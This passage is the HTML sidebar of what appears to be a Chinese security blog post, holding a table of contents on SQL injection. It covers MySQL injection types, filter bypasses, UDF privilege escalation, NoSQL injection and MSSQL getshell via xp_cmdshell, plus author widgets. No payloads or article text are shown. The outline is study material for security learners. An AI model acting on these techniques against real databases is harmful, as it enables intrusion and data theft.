class="nav-number">2.2.2.</span> <span class="nav-text">1.判断是否存在SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="nav-number">2.2.3.</span> <span class="nav-text">2.判断注入方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="nav-number">2.3.</span> <span class="nav-text">sql注入分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-UNION%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.</span> <span class="nav-text">1.UNION联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="nav-number">2.4.1.</span> <span class="nav-text">什么是联合注入？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E4%B8%B4%E6%97%B6%E8%A1%A8"><span class="nav-number">2.4.2.</span> <span class="nav-text">插入临时表</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="nav-number">2.4.2.1.</span> <span class="nav-text">特:万能密码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.5.</span> <span class="nav-text">2.报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XPATH-%E6%8A%A5%E9%94%99"><span class="nav-number">2.5.1.</span> <span class="nav-text">XPATH 报错</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.5.1.1.</span> <span class="nav-text">updatexml()报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#extractvalue-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.5.1.2.</span> <span class="nav-text">extractvalue()报错注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group-by%E6%8A%A5%E9%94%99"><span class="nav-number">2.5.2.</span> <span class="nav-text">group by报错</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#floor-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.5.2.1.</span> <span class="nav-text">floor()报错注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99"><span class="nav-number">2.5.3.</span> <span class="nav-text">数溢出报错</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.5.3.1.</span> <span class="nav-text">exp()报错注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.6.</span> <span class="nav-text">3.布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ASCII%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0"><span class="nav-number">2.6.1.</span> <span class="nav-text">ASCII替换函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#substr%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0"><span class="nav-number">2.6.2.</span> <span class="nav-text">substr替换函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#left-%E5%87%BD%E6%95%B0"><span class="nav-number">2.6.3.</span> <span class="nav-text">left()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#right-%E5%87%BD%E6%95%B0"><span class="nav-number">2.6.4.</span> <span class="nav-text">right()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mid-%E5%87%BD%E6%95%B0"><span class="nav-number">2.6.5.</span> <span class="nav-text">mid()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#substring-%E5%87%BD%E6%95%B0"><span class="nav-number">2.6.6.</span> <span class="nav-text">substring()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">2.6.7.</span> <span class="nav-text">手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80-case-%E2%80%A6-when-%E2%80%A6-then-%E2%80%A6-else-%E2%80%A6-end"><span class="nav-number">2.6.7.1.</span> <span class="nav-text">姿势一:case … when … then … else … end</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.7.</span> <span class="nav-text">4.时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.7.1.</span> <span class="nav-text">常规盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sleep%E5%87%BD%E6%95%B0"><span class="nav-number">2.7.1.1.</span> <span class="nav-text">sleep函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#benchmark%E5%87%BD%E6%95%B0"><span class="nav-number">2.7.1.2.</span> <span class="nav-text">benchmark函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.7.2.</span> <span class="nav-text">笛卡尔积盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF"><span class="nav-number">2.7.2.0.1.</span> <span class="nav-text">什么是笛卡尔积</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RLIKE%E6%B3%A8%E5%85%A5"><span class="nav-number">2.7.3.</span> <span class="nav-text">RLIKE注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RLIKE%E5%87%BD%E6%95%B0"><span class="nav-number">2.7.3.1.</span> <span class="nav-text">RLIKE函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rpad-%E5%87%BD%E6%95%B0"><span class="nav-number">2.7.3.2.</span> <span class="nav-text">rpad()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#REPEAT-%E5%87%BD%E6%95%B0"><span class="nav-number">2.7.3.3.</span> <span class="nav-text">REPEAT()函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GET-LOCK%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.7.4.</span> <span class="nav-text">GET_LOCK盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">2.8.</span> <span class="nav-text">5.堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#handler%E5%87%BD%E6%95%B0"><span class="nav-number">2.8.1.</span> <span class="nav-text">handler函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%90%AF%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95getshell"><span class="nav-number">2.8.2.</span> <span class="nav-text">开启日志记录getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-limit%E6%B3%A8%E5%85%A5"><span class="nav-number">2.9.</span> <span class="nav-text">6.limit注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ANALYSE-%E5%87%BD%E6%95%B0"><span class="nav-number">2.9.1.</span> <span class="nav-text">ANALYSE()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-group-by-%E6%B3%A8%E5%85%A5"><span class="nav-number">2.10.</span> <span class="nav-text">7.group by 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Egroup-by-%E5%AD%90%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.10.1.</span> <span class="nav-text">关于group by 子语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by%E6%B3%A8%E5%85%A5"><span class="nav-number">2.11.</span> <span class="nav-text">order by注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-getshell%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">2.12.</span> <span class="nav-text">8.getshell读写文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">2.13.</span> <span class="nav-text">9.无列名注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%88%86%E5%BA%93%E5%90%8D%E5%92%8C%E8%A1%A8%E5%90%8D"><span class="nav-number">2.13.0.0.1.</span> <span class="nav-text">爆库名和表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-sys%E5%BA%93"><span class="nav-number">2.13.0.0.2.</span> <span class="nav-text">2.sys库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%88%86%E5%88%97%E4%B8%AD%E6%95%B0%E6%8D%AE"><span class="nav-number">2.13.0.0.3.</span> <span class="nav-text">爆列中数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union%E5%8F%96%E5%88%AB%E5%90%8D"><span class="nav-number">2.13.1.</span> <span class="nav-text">union取别名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8join%E7%88%86%E5%88%97%E5%90%8D"><span class="nav-number">2.13.2.</span> <span class="nav-text">利用join爆列名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-UDF%E6%8F%90%E6%9D%83"><span class="nav-number">2.14.</span> <span class="nav-text">10.UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.14.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6"><span class="nav-number">2.14.2.</span> <span class="nav-text">版本限制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">2.15.</span> <span class="nav-text">11.请求头注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UA%E5%A4%B4%E5%92%8CRerferer%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">2.15.1.</span> <span class="nav-text">UA头和Rerferer头注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">2.16.</span> <span class="nav-text">12.二次注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">2.16.1.</span> <span class="nav-text">注入原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.16.2.</span> <span class="nav-text">注入条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="nav-number">2.16.3.</span> <span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">2.17.</span> <span class="nav-text">13.宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AE%BD%E5%AD%97%E8%8A%82"><span class="nav-number">2.17.1.</span> <span class="nav-text">什么是宽字节</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86-1"><span class="nav-number">2.17.2.</span> <span class="nav-text">注入原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BD%AC%E4%B9%89%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87plus"><span class="nav-number">2.18.</span> <span class="nav-text">转义单引号的绕过plus</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Create%E5%88%9B%E5%BB%BA%E8%A1%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">2.19.</span> <span class="nav-text">Create创建表注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CREATE-TABLE-%E2%80%A6-AS-SELECT-%E2%80%A6"><span class="nav-number">2.19.1.</span> <span class="nav-text">CREATE TABLE … AS SELECT …</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass%E6%8A%80%E5%B7%A7"><span class="nav-number">2.20.</span> <span class="nav-text">bypass技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="nav-number">2.20.1.</span> <span class="nav-text">关键字过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="nav-number">2.20.2.</span> <span class="nav-text">绕过空格过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-number">2.20.3.</span> <span class="nav-text">绕过逗号过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87and%E5%92%8Cor%E8%BF%87%E6%BB%A4"><span class="nav-number">2.20.4.</span> <span class="nav-text">绕过and和or过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="nav-number">2.20.5.</span> <span class="nav-text">绕过注释符过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E5%A5%87%E6%80%AA%E7%9A%84%E5%A7%BF%E5%8A%BF"><span class="nav-number">2.21.</span> <span class="nav-text">mysql奇怪的姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%88%A9%E7%94%A8%E9%87%8D%E9%9F%B3%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="nav-number">2.21.0.1.</span> <span class="nav-text">1.利用重音字符绕过过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-sprintf-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87sql"><span class="nav-number">2.21.0.2.</span> <span class="nav-text">2.sprintf()函数绕过sql</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-sql%E6%9F%A5%E8%AF%A2%E5%8A%A0%E7%A9%BA%E6%A0%BC%E4%BB%A5%E5%81%87%E4%B9%B1%E7%9C%9F"><span class="nav-number">2.21.0.3.</span> <span class="nav-text">3.sql查询加空格以假乱真</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6nosql%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">6nosql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFnosql%EF%BC%9F"><span class="nav-number">3.1.</span> <span class="nav-text">什么是nosql？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.1.1.</span> <span class="nav-text">NSQL数据库类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-MongoDB"><span class="nav-number">3.2.</span> <span class="nav-text">什么是 MongoDB ?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8EMongDB%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="nav-number">3.3.</span> <span class="nav-text">关于MongDB基础使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85MongoDB"><span class="nav-number">3.4.</span> <span class="nav-text">安装MongoDB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MongoDB%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="nav-number">3.5.</span> <span class="nav-text">MongoDB基础语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93-1"><span class="nav-number">3.6.</span> <span class="nav-text">1.操作数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%97%E8%A1%A8"><span class="nav-number">3.6.1.</span> <span class="nav-text">查看数据库列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">3.6.2.</span> <span class="nav-text">查看当前使用数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">3.6.3.</span> <span class="nav-text">创建数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">3.6.4.</span> <span class="nav-text">删除数据库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%93%8D%E4%BD%9C%E9%9B%86%E5%90%88"><span class="nav-number">3.7.</span> <span class="nav-text">2.操作集合</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E9%9B%86%E5%90%88"><span class="nav-number">3.7.1.</span> <span class="nav-text">创建集合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E9%9B%86%E5%90%88"><span class="nav-number">3.7.2.</span> <span class="nav-text">查看集合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0%E9%9B%86%E5%90%88%E5%90%8D"><span class="nav-number">3.7.3.</span> <span class="nav-text">更新集合名</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#renameCollection-%E6%96%B9%E6%B3%95"><span class="nav-number">3.7.3.1.</span> <span class="nav-text">renameCollection 方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E9%9B%86%E5%90%88"><span class="nav-number">3.7.4.</span> <span class="nav-text">删除集合</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%93%8D%E4%BD%9C%E6%96%87%E6%A1%A3"><span class="nav-number">3.8.</span> <span class="nav-text">3.操作文档</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E6%96%87%E6%A1%A3"><span class="nav-number">3.8.1.</span> <span class="nav-text">插入文档</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E5%8D%95%E4%B8%AA%E6%96%87%E6%A1%A3insertOne"><span class="nav-number">3.8.1.1.</span> <span class="nav-text">插入单个文档insertOne()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E5%A4%9A%E4%B8%AA%E6%96%87%E6%A1%A3insertMany"><span class="nav-number">3.8.1.2.</span> <span class="nav-text">插入多个文档insertMany()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3"><span class="nav-number">3.8.2.</span> <span class="nav-text">更新文档</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#updateOne-%E6%96%B9%E6%B3%95"><span class="nav-number">3.8.2.1.</span> <span class="nav-text">updateOne()方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updateMany-%E6%96%B9%E6%B3%95"><span class="nav-number">3.8.2.2.</span> <span class="nav-text">updateMany()方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#replaceOne-%E6%96%B9%E6%B3%95"><span class="nav-number">3.8.2.3.</span> <span class="nav-text">replaceOne()方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E6%96%87%E6%A1%A3"><span class="nav-number">3.8.3.</span> <span class="nav-text">删除文档</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%87%E6%A1%A3"><span class="nav-number">3.8.4.</span> <span class="nav-text">查询文档</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#find-%E6%96%B9%E6%B3%95"><span class="nav-number">3.8.4.1.</span> <span class="nav-text">**find()**方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#findOne-%E6%96%B9%E6%B3%95"><span class="nav-number">3.8.4.2.</span> <span class="nav-text">findOne()方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="nav-number">3.9.</span> <span class="nav-text">4.关于操作符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AF%94%E8%BE%83%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="nav-number">3.9.1.</span> <span class="nav-text">比较操作符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="nav-number">3.9.2.</span> <span class="nav-text">逻辑操作符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">3.9.3.</span> <span class="nav-text">正则表达式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nosql%E6%B3%A8%E5%85%A5"><span class="nav-number">3.10.</span> <span class="nav-text">Nosql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-number">3.10.1.</span> <span class="nav-text">注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E9%87%8D%E8%A8%80%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="nav-number">3.10.1.1.</span> <span class="nav-text">1.重言式注入</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mssql%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">mssql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="nav-number">4.0.1.</span> <span class="nav-text">MSSQL基础使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#master%E5%BA%93"><span class="nav-number">4.0.1.1.</span> <span class="nav-text">master库</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">4.0.2.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BA%A7%E5%88%AB"><span class="nav-number">4.0.2.1.</span> <span class="nav-text">服务器级别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BA%A7%E5%88%AB"><span class="nav-number">4.0.2.2.</span> <span class="nav-text">数据库级别</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%AC%A6%E5%8F%B7"><span class="nav-number">4.0.3.</span> <span class="nav-text">常见符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">4.0.4.</span> <span class="nav-text">基本注入流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mssql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">4.0.5.</span> <span class="nav-text">mssql报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.0.6.</span> <span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">4.0.7.</span> <span class="nav-text">联合注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell%E5%92%8C%E6%8F%90%E6%9D%83"><span class="nav-number">4.0.8.</span> <span class="nav-text">getshell和提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-getshell"><span class="nav-number">4.0.8.1.</span> <span class="nav-text">1.getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-1%E5%AF%BB%E6%89%BE%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="nav-number">4.0.8.1.1.</span> <span class="nav-text">1.1寻找绝对路径</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-2-xp-cmdshell%E6%8B%BFshell"><span class="nav-number">4.0.8.1.2.</span> <span class="nav-text">1.2 xp_cmdshell拿shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-3-%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD%E6%8B%BFshell"><span class="nav-number">4.0.8.1.3.</span> <span class="nav-text">1.3 差异备份拿shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-4-log%E5%A4%87%E4%BB%BD%E6%8B%BFshell"><span class="nav-number">4.0.8.1.4.</span> <span class="nav-text">1.4 log备份拿shell</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%8F%90%E6%9D%83getsystem"><span class="nav-number">4.0.8.2.</span> <span class="nav-text">2.提权getsystem</span></a></li></ol></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">173</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">124</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
